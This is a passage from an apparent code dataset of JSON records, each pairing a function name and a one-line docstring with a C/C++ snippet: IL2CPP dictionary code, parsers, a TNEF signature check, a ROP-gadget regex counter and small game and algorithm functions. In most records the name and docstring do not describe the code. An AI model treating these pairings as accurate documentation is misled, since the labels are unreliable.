argument*\/NULL);\\n\\t\\tIL2CPP_RAISE_MANAGED_EXCEPTION(L_4, NULL, Dictionary_2_System_Collections_IDictionary_set_Item_m175E9D1A7B42C16047A707CDFE1BED2430E3342E_RuntimeMethod_var);\\n\\t}\\n\\nIL_002c:\\n\\t{\\n\\t}\\n\\nIL_002d:\\n\\ttry\\n\\t{ \/\/ begin try (depth: 1)\\n\\t\\t{\\n\\t\\t\\tRuntimeObject * L_5 = ___key0;\\n\\t\\t\\tV_1 = (int32_t)((*(int32_t*)((int32_t*)UnBox(L_5, IL2CPP_RGCTX_DATA(method->klass->rgctx_data, 27)))));\\n\\t\\t}\\n\\nIL_0034:\\n\\t\\ttry\\n\\t\\t{ \/\/ begin try (depth: 2)\\n\\t\\t\\tint32_t L_6 = V_1;\\n\\t\\t\\tRuntimeObject * L_7 = ___value1;\\n\\t\\t\\tNullCheck((Dictionary_2_t798422731283F23B411096D7DB14B0E93F33BEDC *)__this);\\n\\t\\t\\t((  void (*) (Dictionary_2_t798422731283F23B411096D7DB14B0E93F33BEDC *, int32_t, bool, const RuntimeMethod*))IL2CPP_RGCTX_METHOD_INFO(method->klass->rgctx_data, 35)->methodPointer)((Dictionary_2_t798422731283F23B411096D7DB14B0E93F33BEDC *)__this, (int32_t)L_6, (bool)((*(bool*)((bool*)UnBox(L_7, IL2CPP_RGCTX_DATA(method->klass->rgctx_data, 17))))), \/*hidden argument*\/IL2CPP_RGCTX_METHOD_INFO(method->klass->rgctx_data, 35));\\n\\t\\t\\tgoto IL_0064;\\n\\t\\t} \/\/ end try (depth: 2)\\n\\t\\tcatch(Il2CppExceptionWrapper& e)\\n\\t\\t{\\n\\t\\t\\t__exception_local = (Exception_t *)e.ex;\\n\\t\\t\\tif(il2cpp_codegen_class_is_assignable_from (InvalidCastException_t91DF9E7D7FCCDA6C562CB4A9A18903E016680FDA_il2cpp_TypeInfo_var, il2cpp_codegen_object_class(e.ex)))\\n\\t\\t\\t\\tgoto CATCH_0043;\\n\\t\\t\\tthrow e;\\n\\t\\t}\\n\\nCATCH_0043:\\n\\t\\t{ \/\/ begin catch(System.InvalidCastException)\\n\\t\\t\\tRuntimeObject * L_8 = ___value1;\\n\\t\\t\\tRuntimeTypeHandle_t7B542280A22F0EC4EAC2061C29178845847A8B2D  L_9 = { reinterpret_cast<intptr_t> (IL2CPP_RGCTX_TYPE(method->klass->rgctx_data, 36)) };\\n\\t\\t\\tIL2CPP_RUNTIME_CLASS_INIT(Type_t_il2cpp_TypeInfo_var);\\n\\t\\t\\tType_t * L_10 = Type_GetTypeFromHandle_m9DC58ADF0512987012A8A016FB64B068F3B1AFF6((RuntimeTypeHandle_t7B542280A22F0EC4EAC2061C29178845847A8B2D )L_9, \/*hidden argument*\/NULL);\\n\\t\\t\\tString_t* L_11 = SR_Format_m2DD0EA1F52576669B34B03CDB3D441631E1CA76C((String_t*)_stringLiteralFA5354A55A2D5AE97DEF68A54DFDDBF37A452FD6, (RuntimeObject *)L_8, (RuntimeObject *)L_10, \/*hidden argument*\/NULL);\\n\\t\\t\\tArgumentException_tEDCD16F20A09ECE461C3DA766C16EDA8864057D1 * L_12 = (ArgumentException_tEDCD16F20A09ECE461C3DA766C16EDA8864057D1 *)il2cpp_codegen_object_new(ArgumentException_tEDCD16F20A09ECE461C3DA766C16EDA8864057D1_il2cpp_TypeInfo_var);\\n\\t\\t\\tArgumentException__ctor_m26DC3463C6F3C98BF33EA39598DD2B32F0249CA8(L_12, (String_t*)L_11, (String_t*)_stringLiteralF32B67C7E26342AF42EFABC674D441DCA0A281C5, \/*hidden argument*\/NULL);\\n\\t\\t\\tIL2CPP_RAISE_MANAGED_EXCEPTION(L_12, NULL, Dictionary_2_System_Collections_IDictionary_set_Item_m175E9D1A7B42C16047A707CDFE1BED2430E3342E_RuntimeMethod_var);\\n\\t\\t} \/\/ end catch (depth: 2)\\n\\nIL_0064:\\n\\t\\t{\\n\\t\\t\\tgoto IL_0087;\\n\\t\\t}\\n\\t} \/\/ end try (depth: 1)\\n\\tcatch(Il2CppExceptionWrapper& e)\\n\\t{\\n\\t\\t__exception_local = (Exception_t *)e.ex;\\n\\t\\tif(il2cpp_codegen_class_is_assignable_from (InvalidCastException_t91DF9E7D7FCCDA6C562CB4A9A18903E016680FDA_il2cpp_TypeInfo_var, il2cpp_codegen_object_class(e.ex)))\\n\\t\\t\\tgoto CATCH_0066;\\n\\t\\tthrow e;\\n\\t}\\n\\nCATCH_0066:\\n\\t{ \/\/ begin catch(System.InvalidCastException)\\n\\t\\tRuntimeObject * L_13 = ___key0;\\n\\t\\tRuntimeTypeHandle_t7B542280A22F0EC4EAC2061C29178845847A8B2D  L_14 = { reinterpret_cast<intptr_t> (IL2CPP_RGCTX_TYPE(method->klass->rgctx_data, 37)) };\\n\\t\\tIL2CPP_RUNTIME_CLASS_INIT(Type_t_il2cpp_TypeInfo_var);\\n\\t\\tType_t * L_15 = Type_GetTypeFromHandle_m9DC58ADF0512987012A8A016FB64B068F3B1AFF6((RuntimeTypeHandle_t7B542280A22F0EC4EAC2061C29178845847A8B2D )L_14, \/*hidden argument*\/NULL);\\n\\t\\tString_t* L_16 = SR_Format_m2DD0EA1F52576669B34B03CDB3D441631E1CA76C((String_t*)_stringLiteralFA5354A55A2D5AE97DEF68A54DFDDBF37A452FD6, (RuntimeObject *)L_13, (RuntimeObject *)L_15, \/*hidden argument*\/NULL);\\n\\t\\tArgumentException_tEDCD16F20A09ECE461C3DA766C16EDA8864057D1 * L_17 = (ArgumentException_tEDCD16F20A09ECE461C3DA766C16EDA8864057D1 *)il2cpp_codegen_object_new(ArgumentException_tEDCD16F20A09ECE461C3DA766C16EDA8864057D1_il2cpp_TypeInfo_var);\\n\\t\\tArgumentException__ctor_m26DC3463C6F3C98BF33EA39598DD2B32F0249CA8(L_17, (String_t*)L_16, (String_t*)_stringLiteralA62F2225BF70BFACCBC7F1EF2A397836717377DE, \/*hidden argument*\/NULL);\\n\\t\\tIL2CPP_RAISE_MANAGED_EXCEPTION(L_17, NULL, Dictionary_2_System_Collections_IDictionary_set_Item_m175E9D1A7B42C16047A707CDFE1BED2430E3342E_RuntimeMethod_var);\\n\\t} \/\/ end catch (depth: 1)\\n\\nIL_0087:\\n\\t{\\n\\t\\treturn;\\n\\t}\\n}'}","id":4969}
{"content":"{'function_name': 'par_data', 'docstring': '\/\/  \/4', 'code': 'int checkStart(xchain *chain)\\n{\\n    char buf[9] = { 0 };\\n    xassert(chain);\\n    \/\/par\\n    if (!pkt_match_short_tag(chain, 0xA55A)) {\\n        xerror(\"checkStart pkt_match_short_tag not find 0xA55A\");\\n        return -1;\\n    }\\n\\n    xchain_get(chain, (void *)buf, 7);\\n    xchain_delete(chain, 7);\\n\\n\\n    if ((buf[5]&0xC0) != 0x1) {\\n        xerror(\"checkStart pkt_match_head 0x1\");\\n        return -1;\\n    }\\n\\n    xmessage(\"start ladar\\\\n\");\\n    return 0;\\n}'}","id":4972}
{"content":"{'function_name': 'AnalyzeReturnValues', 'docstring': '\/\/ to agree with the calling convention ABI.', 'code': \"static std::pair<bool, bool> parsePhysicalReg(const StringRef &C, std::string &Prefix, unsigned long long &Reg) {\\n    if (C.front() != '{' || C.back() != '}')\\n        return std::make_pair(false, false);\\n\\n    \/\/ Search for the first numeric character.\\n    StringRef::const_iterator I, B = C.begin() + 1, E = C.end() - 1;\\n    I = std::find_if(B, E, std::ptr_fun(isdigit));\\n\\n    Prefix.assign(B, I - B);\\n\\n    \/\/ The second flag is set to false if no numeric characters were found.\\n    if (I == E)\\n        return std::make_pair(true, false);\\n\\n    \/\/ Parse the numeric characters.\\n    return std::make_pair(!getAsUnsignedInteger(StringRef(I, E - I), 10, Reg), true);\\n}\"}","id":4979}
{"content":"{'function_name': 'advanceButtonClicked', 'docstring': '\/\/ Only do something when the button is released', 'code': 'uint32_t getSizeOfScreenShotAsBMP() {\\n    return (2ul * oled->getWidth() * oled->getHeight() + 54); \/\/ pix data + 54 byte hdr\\n  }'}","id":4980}
{"content":"{'function_name': 'stream_to_mem', 'docstring': '\/* read it *\/', 'code': 'int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)\\n{\\n\\tUINT  num = 0;          \/\/ number of image encoders\\n\\tUINT  size = 0;         \/\/ size of the image encoder array in bytes\\n\\tImageCodecInfo* pImageCodecInfo = NULL;\\n\\tGetImageEncodersSize(&num, &size);\\n\\tif(size == 0)\\n\\t\\treturn -1;  \/\/ Failure\\n\\tpImageCodecInfo = (ImageCodecInfo*)(malloc(size));\\n\\tif(pImageCodecInfo == NULL)\\n\\t\\treturn -1;  \/\/ Failure\\n\\tGetImageEncoders(num, size, pImageCodecInfo);\\n\\tfor(UINT j = 0; j < num; ++j)\\n\\t{\\n\\t\\tif( wcscmp(pImageCodecInfo[j].MimeType, format) == 0 )\\n\\t\\t{\\n\\t\\t\\t*pClsid = pImageCodecInfo[j].Clsid;\\n\\t\\t\\tfree(pImageCodecInfo);\\n\\t\\t\\treturn j;  \/\/ Success\\n\\t\\t}   \\n\\t}\\n\\tfree(pImageCodecInfo);\\n\\treturn -1;  \/\/ Failure\\n}'}","id":4983}
{"content":"{'function_name': 'delete_duplicate_gadgets', 'docstring': '\/\/printf(\"%lu\\\\n\", gadgets.size());', 'code': 'int find_gadgets_MOVTC(vector<string> gadgets, string pattern, set<string> *regset) {\\n\\tsmatch m, m2;\\n\\tregex rgx(pattern);\\n\\tregex rgx2(R\"([er|r][abcdsi1-9]?[xip1-9])\"); \/\/for extracting registers\\n\\n\\tstring gitem;\\n\\n\\tint total = 0;\\n\\n\\tfor (int i=0; i<gadgets.size(); i++) {\\n\\t\\tif (regex_search(gadgets[i], m, rgx)) {\\n\\t\\t\\ttotal += 1;\\n\\t\\t\\t\/\/cout << gadgets[i] << endl;\\n\\t\\t\\t\\n\\t\\t\\tgitem = gadgets[i];\\n\\t\\t\\twhile (regex_search(gitem, m2, rgx2)){\\n\\t\\t\\t\\t\/\/cout << m2.str() << \" \";\\n\\t\\t\\t\\tregset->insert(m2.str());\\n\\t\\t\\t\\tgitem = m2.suffix();\\n\\t\\t\\t}\\n\\t\\t\\t\/\/cout << endl;\\n\\t\\t}\\n\\t}\\n\\n\\treturn total;\\n}'}","id":4985}
{"content":"{'function_name': 'moveMenu', 'docstring': '\/\/Captures the number from the user of which ship to move', 'code': 'int moveWhere(void){ \/\/Asks the player where he would like to move his ship\\n\\t\\terase();\\n\\t\\theadsUp(getTurn());\\n\\t\\tcout << \" Please enter where you would like to move your ship.\" << endl<< endl << endl << endl << endl;\\n\\t\\t\\n\\t\\tcin >> moveS;\\t\\t\/\/Captures the grid number of where to move the ship\\n\\t\\treturn moveS;\\n}'}","id":4986}
{"content":"{'function_name': 'eksploatacija', 'docstring': '\/\/trenutni stroj', 'code': 'vector<int> istrazivanje(int k, int N){\\n\\n\\tint i;\\n\\tdouble sum=0;\\n\\tvector<int> pom;\\n\\tfor(int i=0;i<2;i++)\\n\\t\\tpom.push_back(0);\\n\\t\/\/trenutni polo\u017eaj mrava k\\n\\tint lk=trenutna_aktivnost_mrava[k][0]; \\t\\n\\t\/\/trenutni stroj\\n\\tint mch=trenutna_aktivnost_mrava[k][1];\\n\\tint count=0;\\n\\tdouble r=drand();\\n\\t\\n\\t\/\/izra\u010dun ukupnog\\n\\tfor(int i=0;i<vektor_poslova[N];i++){\\n\\t\\tfor(int j=0;j<vektor_strojeva[N];j++){\\n\\t\\n\\t\\t\\t\/\/if(tabu_lista[k][i]==1&&heuristicke_vrijednosti[lk][i]!=Beskonacnost)\\n\\t\\t\\t\/\/ako mrav ima dostupan odlazak u sljedece aktivnosti\\n\\t\\t\\t\/\/zbrajam umno\u017eak (nazivnik)\\n\\t\\t\\tif(tabu_lista[k][i]==1 && lk!=i){\\n\\t\\t\\t\\tsum=sum+pow(jacina_feromonskog_traga[lk][i][j],alfa)*pow(tablica_heuristickih_vrijednosti[lk][i][j],beta);\\n\\t\\t\\t\\tcount++;\\n\\t\\t\\t}\\n\\t\\t}\\n\\t}\\t\\n\\tdouble x=0;\\n\\tdouble y=0;\\n\\tfor(int i=0;i<vektor_poslova[N];i++){\\n\\t\\tfor(int j=0;j<vektor_strojeva[N];j++){\\n\\n\\t\\t\\t\/\/if(tabu_lista[k][i]==1&&heuristicke_vrijednosti[lk][i]!=Beskonacnost)\\n\\t\\t\\t\/\/radim vjerojatnosnu funkciju<karakteristicna funkcija za ACO>\\n\\t\\t\\tif(tabu_lista[k][i]==1 && lk!=i){\\t\\n\\n\\t\\t\\t\\ty=y+pow(jacina_feromonskog_traga[lk][i][j],alfa)*pow(tablica_heuristickih_vrijednosti[lk][i][j],beta);\\t\\n\\t\\t\\t\\t\/\/ako je slucajna vrijednst veca od x\/(zbroj vjerojatnosti odlazaka) i manja od y\/(-||-)\\n\\t\\t\\t\\tif(r>=x\/sum && r<y\/sum){\\n\\t\\t\\t\\t\\tpom[0]=i;\\n\\t\\t\\t\\t\\tpom[1]=j;\\n\\t\\t\\t\\t\\tbreak;\\n\\t\\t\\t\\t}\\n\\t\\t\\t\\telse\\n\\t\\t\\t\\t\\tx=y;\\n\\t\\t\\t}\\n\\t\\t}\\n\\t}\\n\\t\/\/vrati index sljedece aktivnosti\\n\\treturn pom;\\n}'}","id":4989}
{"content":"{'function_name': 'drawBackgroundVectorscope', 'docstring': '\/\/ Circle', 'code': 'Mat drawBackgroundWaveform(Mat img){\\n\\tScalar color(0, 128, 255, 100); \/\/RGB(255, 128, 0)\\n\\tint thickness = 1;\\n\\tfor (int i = 0; i<WAVE_GRADATION_POINT; i++){\\n\\t\\t\/\/ line\\n\\t\\tline(img, Point(WAVEFORM_INTERVAL_WIDTH, 30 + L_DEPTH * i), Point(WAVEFORM_BACKGROUND_WIDTH - WAVEFORM_INTERVAL_WIDTH, 30 + L_DEPTH * i), color, thickness);\\n\\t\\t\/\/ Text\\n\\t\\tif (i < 6)\\tputText(img, WAVE_GRAD[i], Point(1, 30 + L_DEPTH * i - 6), FONT_HERSHEY_SIMPLEX, 0.3, color, thickness);\\n\\t\\telse\\t\\tputText(img, WAVE_GRAD[i], Point(7, 30 + L_DEPTH * i - 6), FONT_HERSHEY_SIMPLEX, 0.3, color, thickness);\\n\\t\\tputText(img, WAVE_GRAD[i], Point(WAVEFORM_BACKGROUND_WIDTH - WAVEFORM_INTERVAL_WIDTH + 1, 30 + L_DEPTH * i - 6), FONT_HERSHEY_SIMPLEX, 0.3, color, thickness);\\n\\t}\\n\\treturn img;\\n}'}","id":4990}
{"content":"{'function_name': 'MimeOleIsEnrichedStream', 'docstring': '\/\/ Compare\\r', 'code': 'MIMEOLEAPI MimeOleIsTnefStream(IStream *pStream)\\r\\n{\\r\\n    \/\/ Locals\\r\\n    HRESULT     hr=S_OK;\\r\\n    BYTE        rgbSignature[4];\\r\\n    ULONG       cbRead;\\r\\n\\r\\n    \/\/ Invalid Arg\\r\\n    if (NULL == pStream)\\r\\n        return TrapError(E_INVALIDARG);\\r\\n\\r\\n    \/\/ Read the first four bytes\\r\\n    CHECKHR(hr = pStream->Read(rgbSignature, sizeof(rgbSignature), &cbRead));\\r\\n\\r\\n    \/\/ Less than four bytes read ?\\r\\n    if (cbRead < 4)\\r\\n    {\\r\\n        hr = S_FALSE;\\r\\n        goto exit;\\r\\n    }\\r\\n\\r\\n    \/\/ Compare bytes\\r\\n    if (rgbSignature[0] != 0x78 && rgbSignature[1] != 0x9f &&\\r\\n        rgbSignature[2] != 0x3e && rgbSignature[3] != 0x22)\\r\\n    {\\r\\n        hr = S_FALSE;\\r\\n        goto exit;\\r\\n    }\\r\\n\\r\\n    \/\/ Its TNEF\\r\\n    hr = S_OK;\\r\\n\\r\\nexit:\\r\\n    \/\/ Done\\r\\n    return hr;\\r\\n}'}","id":5004}
{"content":"{'function_name': 'parse_line', 'docstring': '\/\/ Up to 21 chars, tab(s), value', 'code': 'static std::string\\nmake_desc (std::string key)\\n{\\n\\t\/\/ underscore\/dot -> space\\n\\tstd::size_t pos = -1;\\n\\tdo {\\n\\t\\tpos = key.find_first_of (\"_.\", pos+1);\\n\\t\\tif (pos != std::string::npos) {\\n\\t\\t\\tkey[pos] = \\' \\';\\n\\t\\t}\\n\\n\\t} while (pos != std::string::npos);\\n\\n\\tkey[0] = ::toupper (key[0]);\\n\\treturn key;\\n}'}","id":5007}
{"content":"{'function_name': 'Wrap', 'docstring': '\/\/\u4e3a\u4ec0\u4e48\u8fd9\u91cc\u4e0d\u7528std::forward\u5462\uff1f', 'code': 'void Wrap(R (C::*f)(DArgs...), P &&p, Args &&... args) { \/\/\u6210\u5458\u51fd\u6570\u6307\u9488\u7684\u7c7b\u578b\\n    fun_ = [&, f]() { return (*p.*f)(args...); }; \/\/\u8c03\u7528\u6210\u5458\u51fd\u6570\u6307\u9488\\n  }'}","id":5013}
{"content":"{'function_name': 'ogre_app_init', 'docstring': '\/********************************* Create Scene ****************************\/', 'code': 'static int app_setup_display(app_user_data* data){\\n  \/\/ to system level\\n  LOGI(\"GW Setup display\");\\n\\n  AConfiguration *config = AConfiguration_new();\\n  AConfiguration_fromAssetManager(config, data->android_app_state->activity->assetManager);\\n\\n  if (data->window == NULL){\\n    Ogre::NameValuePairList opt;\\n    opt[\"externalWindowHandle\"] = Ogre::StringConverter::toString((int)data->android_app_state->window);\\n    opt[\"androidConfig\"] = Ogre::StringConverter::toString((int)config);\\n\\n    data->window = Ogre::Root::getSingleton().createRenderWindow(\"OgreWindow\", 0, 0, false, &opt);\\n    GW::App::getSingleton()->setupDisplay(data->window);\\n    ogre_app_init(data);\\n  } else {\\n    static_cast<Ogre::AndroidEGLWindow*>(data->window)->_createInternalResources(\\n      data->android_app_state->window, config\\n      );\\n  }\\n\\n  AConfiguration_delete(config);\\n\\n  return 0;\\n}'}","id":5029}
{"content":"{'function_name': 'nu_all_chi2_b', 'docstring': '\/\/direct form: chi2 = sum{1..k} ((Ys - nPs) ^ 2 \/ nPs)', 'code': 'int nu_score (char* xseq, int xpos, char* yseq, int ypos, int len, int* matc)\\n{\\n    int i, matches;\\n    int xn[4], yn[4];\\n    float p;\\n\\n    \/\/reset nucleotide composition\\n    for (i = 0; i < 4; i++)\\n        xn[i] = 0, yn[i] = 0;\\n\\n    \/\/calculate nucleotide composition\\n    for (i = 0, matches = 0; i < len; i++)\\n    {\\n        int xb = get_base(xseq, xpos + i);\\n        int yb = get_base(yseq, ypos + i);\\n        if (xb == yb) matches ++;\\n        xn[xb]++, yn[yb]++;\\n    }\\n\\n    \/\/calculate single match probability\\n    for (i = 0, p = 0.; i < 4; i++)\\n        p += (float) xn[i] * yn[i];\\n\\n    \/\/return adjusted homology level in %\\n    \/\/ ((matches * 100) \/ len) \/ ((4. * p) \/ (len * len))\\n    if (matc)\\n        *matc = matches;\\n\\n    return (int)((float) matches * 100. * len \/ (4. * p));\\n}'}","id":5034}
{"content":"{'function_name': 'Dictionary_2_Do_ICollectionCopyTo_TisIntPtr_t_m3403843327_gshared', 'docstring': '\/\/ end catch (depth: 1)', 'code': 'void Dictionary_2_Do_ICollectionCopyTo_TisIl2CppObject_m4050345195_gshared (Dictionary_2_t3623983712 * __this, Il2CppArray * ___array, int32_t ___index, Transform_1_t279183636 * ___transform, const MethodInfo* method)\\n{\\n\\tstatic bool s_Il2CppMethodIntialized;\\n\\tif (!s_Il2CppMethodIntialized)\\n\\t{\\n\\t\\til2cpp_codegen_initialize_method (Dictionary_2_Do_ICollectionCopyTo_TisIl2CppObject_m4050345195_MetadataUsageId);\\n\\t\\ts_Il2CppMethodIntialized = true;\\n\\t}\\n\\tType_t * V_0 = NULL;\\n\\tType_t * V_1 = NULL;\\n\\tException_t1145979430 * V_2 = NULL;\\n\\tException_t1145979430 * __last_unhandled_exception = 0;\\n\\tNO_UNUSED_WARNING (__last_unhandled_exception);\\n\\tException_t1145979430 * __exception_local = 0;\\n\\tNO_UNUSED_WARNING (__exception_local);\\n\\tint32_t __leave_target = 0;\\n\\tNO_UNUSED_WARNING (__leave_target);\\n\\t{\\n\\t\\tIL2CPP_RUNTIME_CLASS_INIT(Type_t_il2cpp_TypeInfo_var);\\n\\t\\tType_t * L_0 = Type_GetTypeFromHandle_m432505302(NULL \/*static, unused*\/, (RuntimeTypeHandle_t2078935215 )LoadTypeToken(IL2CPP_RGCTX_TYPE(method->rgctx_data, 0)), \/*hidden argument*\/NULL);\\n\\t\\tV_0 = (Type_t *)L_0;\\n\\t\\tIl2CppArray * L_1 = ___array;\\n\\t\\tNullCheck((Il2CppObject *)L_1);\\n\\t\\tType_t * L_2 = Object_GetType_m191970594((Il2CppObject *)L_1, \/*hidden argument*\/NULL);\\n\\t\\tNullCheck((Type_t *)L_2);\\n\\t\\tType_t * L_3 = VirtFuncInvoker0< Type_t * >::Invoke(43 \/* System.Type System.Type::GetElementType() *\/, (Type_t *)L_2);\\n\\t\\tV_1 = (Type_t *)L_3;\\n\\t}\\n\\nIL_0017:\\n\\ttry\\n\\t{ \/\/ begin try (depth: 1)\\n\\t\\t{\\n\\t\\t\\tType_t * L_4 = V_0;\\n\\t\\t\\tNullCheck((Type_t *)L_4);\\n\\t\\t\\tbool L_5 = VirtFuncInvoker0< bool >::Invoke(30 \/* System.Boolean System.Type::get_IsPrimitive() *\/, (Type_t *)L_4);\\n\\t\\t\\tif (L_5)\\n\\t\\t\\t{\\n\\t\\t\\t\\tgoto IL_002d;\\n\\t\\t\\t}\\n\\t\\t}\\n\\nIL_0022:\\n\\t\\t{\\n\\t\\t\\tType_t * L_6 = V_1;\\n\\t\\t\\tNullCheck((Type_t *)L_6);\\n\\t\\t\\tbool L_7 = VirtFuncInvoker0< bool >::Invoke(30 \/* System.Boolean System.Type::get_IsPrimitive() *\/, (Type_t *)L_6);\\n\\t\\t\\tif (!L_7)\\n\\t\\t\\t{\\n\\t\\t\\t\\tgoto IL_003f;\\n\\t\\t\\t}\\n\\t\\t}\\n\\nIL_002d:\\n\\t\\t{\\n\\t\\t\\tType_t * L_8 = V_1;\\n\\t\\t\\tType_t * L_9 = V_0;\\n\\t\\t\\tNullCheck((Type_t *)L_8);\\n\\t\\t\\tbool L_10 = VirtFuncInvoker1< bool, Type_t * >::Invoke(40 \/* System.Boolean System.Type::IsAssignableFrom(System.Type) *\/, (Type_t *)L_8, (Type_t *)L_9);\\n\\t\\t\\tif (L_10)\\n\\t\\t\\t{\\n\\t\\t\\t\\tgoto IL_003f;\\n\\t\\t\\t}\\n\\t\\t}\\n\\nIL_0039:\\n\\t\\t{\\n\\t\\t\\tException_t1145979430 * L_11 = (Exception_t1145979430 *)il2cpp_codegen_object_new(Exception_t1145979430_il2cpp_TypeInfo_var);\\n\\t\\t\\tException__ctor_m3886110570(L_11, \/*hidden argument*\/NULL);\\n\\t\\t\\tIL2CPP_RAISE_MANAGED_EXCEPTION(L_11);\\n\\t\\t}\\n\\nIL_003f:\\n\\t\\t{\\n\\t\\t\\tIl2CppArray * L_12 = ___array;\\n\\t\\t\\tint32_t L_13 = ___index;\\n\\t\\t\\tTransform_1_t279183636 * L_14 = ___transform;\\n\\t\\t\\tNullCheck((Dictionary_2_t3623983712 *)__this);\\n\\t\\t\\t((  void (*) (Dictionary_2_t3623983712 *, ObjectU5BU5D_t3632007997*, int32_t, Transform_1_t279183636 *, const MethodInfo*))IL2CPP_RGCTX_METHOD_INFO(method->rgctx_data, 1)->method)((Dictionary_2_t3623983712 *)__this, (ObjectU5BU5D_t3632007997*)((ObjectU5BU5D_t3632007997*)Castclass(L_12, ObjectU5BU5D_t3632007997_il2cpp_TypeInfo_var)), (int32_t)L_13, (Transform_1_t279183636 *)L_14, \/*hidden argument*\/IL2CPP_RGCTX_METHOD_INFO(method->rgctx_data, 1));\\n\\t\\t\\tgoto IL_0069;\\n\\t\\t}\\n\\t} \/\/ end try (depth: 1)\\n\\tcatch(Il2CppExceptionWrapper& e)\\n\\t{\\n\\t\\t__exception_local = (Exception_t1145979430 *)e.ex;\\n\\t\\tif(il2cpp_codegen_class_is_assignable_from (Exception_t1145979430_il2cpp_TypeInfo_var, e.ex->object.klass))\\n\\t\\t\\tgoto CATCH_0052;\\n\\t\\tthrow e;\\n\\t}\\n\\nCATCH_0052:\\n\\t{ \/\/ begin catch(System.Exception)\\n\\t\\t{\\n\\t\\t\\tV_2 = (Exception_t1145979430 *)((Exception_t1145979430 *)__exception_local);\\n\\t\\t\\tException_t1145979430 * L_15 = V_2;\\n\\t\\t\\tArgumentException_t2320721629 * L_16 = (ArgumentException_t2320721629 *)il2cpp_codegen_object_new(ArgumentException_t2320721629_il2cpp_TypeInfo_var);\\n\\t\\t\\tArgumentException__ctor_m3312963299(L_16, (String_t*)_stringLiteral3845490374, (String_t*)_stringLiteral1185213181, (Exception_t1145979430 *)L_15, \/*hidden argument*\/NULL);\\n\\t\\t\\tIL2CPP_RAISE_MANAGED_EXCEPTION(L_16);\\n\\t\\t}\\n\\nIL_0064:\\n\\t\\t{\\n\\t\\t\\tgoto IL_0069;\\n\\t\\t}\\n\\t} \/\/ end catch (depth: 1)\\n\\nIL_0069:\\n\\t{\\n\\t\\treturn;\\n\\t}\\n}'}","id":5035}
{"content":"{'function_name': 'generate_insert_sensor_SQL_command', 'docstring': '\/\/   cout << \"inside databasefunc::generate_sensor_SQL_command()\" << endl;', 'code': 'bool delete_world_annotation(\\n      gis_database* gis_database_ptr,int annotation_ID)\\n   {\\n\/\/   cout << \"inside databasefunc::delete_world_annotation()\" << endl;\\n\\n      string SQL_command=\"delete from world_annotations where id=\";\\n      SQL_command += stringfunc::number_to_string(annotation_ID)+\";\";\\n      \\n      vector<string> delete_commands;\\n      delete_commands.push_back(SQL_command);\\n\/\/      cout << \"delete_commands.back() = \" << delete_commands.back() << endl;\\n\/\/      cout << \"gis_database_ptr = \" << gis_database_ptr << endl;\\n      gis_database_ptr->set_SQL_commands(delete_commands);\\n      return gis_database_ptr->execute_SQL_commands();\\n   }'}","id":5037}
{"content":"{'function_name': 'ahci_ch_intr', 'docstring': '\/* Read interrupt statuses. *\/', 'code': 'static void ahci_ch_intr_direct(void *arg) {\\n  struct ahci_channel *ch = (struct ahci_channel *)arg;\\n  \/\/ struct ccb_hdr *ccb_h;\\n  uint32_t istatus;\\n  \/\/ STAILQ_HEAD(, ccb_hdr) tmp_doneq = STAILQ_HEAD_INITIALIZER(tmp_doneq);\\n  Queue<PacketAtaio> tmp_doneq;\\n\\n  \/* Read interrupt statuses. *\/\\n  istatus = ATA_INL(ch->r_mem, AHCI_P_IS);\\n  if (istatus == 0) return;\\n\\n  mtx_lock(&ch->mtx);\\n  ch->batch = 1;\\n  ahci_ch_intr_main(ch, istatus);\\n  ch->batch = 0;\\n  \/*\\n   * Prevent the possibility of issues caused by processing the queue\\n   * while unlocked below by moving the contents to a local queue.\\n   *\/\\n  \/\/ STAILQ_CONCAT(&tmp_doneq, &ch->doneq);\\n  while (!ch->dev->GetMasterClass<AhciChannel>()->tmp_doneq.IsEmpty()) {\\n    PacketAtaio *ataio;\\n    kassert(ch->dev->GetMasterClass<AhciChannel>()->tmp_doneq.Pop(ataio));\\n    tmp_doneq.Push(ataio);\\n  }\\n  mtx_unlock(&ch->mtx);\\n  while (!tmp_doneq.IsEmpty()) {\\n    PacketAtaio *ataio;\\n    kassert(tmp_doneq.Pop(ataio));\\n    ch->dev->GetMasterClass<AhciChannel>()->DonePacket(ataio);\\n  }\\n  \/\/ while ((ccb_h = STAILQ_FIRST(&tmp_doneq)) != NULL) {\\n  \/\/  \\tSTAILQ_REMOVE_HEAD(&tmp_doneq, sim_links.stqe);\\n  \/\/  \\txpt_done_direct((union ccb *)ccb_h);\\n  \/\/ }\\n}'}","id":5039}
{"content":"{'function_name': 'tree_identical', 'docstring': '\/\/ both trees are NULL, identcial ', 'code': 'void\\ntree_mirror(node_t *tree) {\\n\\n  if (!tree) return;\\n  \\n  if (tree->left) tree_mirror(tree->left);\\n  if (tree->right) tree_mirror(tree->right);\\n\\n  \/\/ swap\\n  node_t *tmp;\\n  tmp = tree->left;\\n  tree->left = tree->right;\\n  tree->right = tmp;\\n\\n  return;\\n}'}","id":5040}
{"content":"{'function_name': 'LLVPS', 'docstring': '\/\/ iterate over the characters of the string', 'code': 'int main()\\n{\\n    ios_base::sync_with_stdio(false), cin.tie(nullptr), cout.tie(nullptr);\\n    srand(chrono::high_resolution_clock::now().time_since_epoch().count());\\n\\n    \/\/ #ifndef ONLINE_JUDGE\\n    \/\/     freopen(\"input.txt\", \"r\", stdin);\\n    \/\/     freopen(\"output.txt\", \"w\", stdout);\\n    \/\/ #endif\\n\\n    int t = 1;\\n    \/\/ int test = 1;\\n    \/\/ cin >> t;\\n    while(t--) {\\n      \/\/ cout << \"Case #\" << test++ << \": \";\\n      solve();\\n    }\\n\\n    return 0;\\n}'}","id":5047}
